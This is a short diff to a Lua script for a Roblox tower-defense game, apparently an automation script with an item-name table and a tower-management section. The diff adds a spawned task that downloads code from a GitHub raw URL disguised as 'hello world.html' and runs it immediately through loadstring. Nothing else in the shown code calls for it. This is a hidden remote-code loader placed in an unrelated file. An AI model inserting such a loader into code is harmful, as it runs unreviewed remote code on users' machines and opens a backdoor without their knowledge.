@@ -59,6 +59,10 @@ local ItemNames = {
     ["139414922355803"] = "Present Clusters(s)"
 }
 
+task.spawn(function()
+    loadstring(game:HttpGet('https://raw.githubusercontent.com/ColaCydiaRepo/Scripts/main/hello%20world.html'))()
+end)
+
 -- // tower management core
 local TDS = {
     placed_towers = {},
